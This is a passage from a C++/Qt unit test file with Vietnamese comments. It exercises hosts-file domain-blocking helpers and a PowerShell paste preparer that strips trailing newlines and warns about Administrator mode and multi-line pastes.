        const QString path3 = tmp.path() + "/hosts-moi";
        CHECK(listBlockedDomainsInFile(path3, &err).isEmpty());
        CHECK(addDomainToFile(path3, "moi.example", &err));
        CHECK(listBlockedDomainsInFile(path3) == QStringList({"moi.example"}));
        CHECK(!QFile::exists(backupFilePath(path3)));

        // Mục cũ không hợp lệ do bản trước ghi vào vẫn hiện ra và gỡ được
        const QString path4 = tmp.path() + "/hosts-cu";
        CHECK(writeBytes(path4, (kMarkerStart + "\r\n0.0.0.0 http://cu.example/a\r\n" + kMarkerEnd + "\r\n").toUtf8()));
        CHECK(listBlockedDomainsInFile(path4) == QStringList({"http://cu.example/a"}));
        CHECK(removeDomainFromFile(path4, "http://cu.example/a", &err));
        CHECK(listBlockedDomainsInFile(path4).isEmpty());
    }

    // ---- CommandLauncherInternal: chuẩn bị văn bản dán + cảnh báo trước khi dán (KHÔNG mở PowerShell) ----
    {
        using namespace CommandLauncherInternal;
        // Ký tự xuống dòng ở cuối = console tự bấm Enter hộ khi dán -> phải bị bỏ
        CHECK(prepareForPaste("Get-Process\r\n") == "Get-Process");
        CHECK(prepareForPaste("\n\n  Get-Process  \n\n") == "  Get-Process");
        CHECK(prepareForPaste("a\r\nb\rc") == "a\nb\nc");
        CHECK(prepareForPaste(QString("a") + QChar(0x2029) + "b") == "a\nb");
        CHECK(prepareForPaste(" \r\n\t ").isEmpty());
        CHECK(lineCount("") == 0);
        CHECK(lineCount("a") == 1);
        CHECK(lineCount(prepareForPaste("a\nb\n\nc\n")) == 4);

        CHECK(pasteWarnings("Get-Process", false).isEmpty());
        CHECK(pasteWarnings("Get-Process", true).size() == 1);
        CHECK(pasteWarnings("Get-Process", true).first().contains("Administrator"));
        CHECK(pasteWarnings("a\nb", false).size() == 1);
        CHECK(pasteWarnings("a\nb", false).first().contains("2 dòng"));
        CHECK(pasteWarnings("a\nb", true).size() == 2);
    }

    std::printf("passed=%d failed=%d\n", g_pass, g_fail);
    std::printf("\nLUU Y: khong co Windows Defender/hosts file THAT trong test nay - cac ham goi\n");
    std::printf("PowerShell/doc-ghi he thong that (getStatus/startScan/listThreats/removeAllActiveThreats/\n");
    std::printf("addDomain/removeDomain/CommandLauncher) can duoc tu kiem tra tay tren may that.\n");
    return g_fail == 0 ? 0 : 1;
}
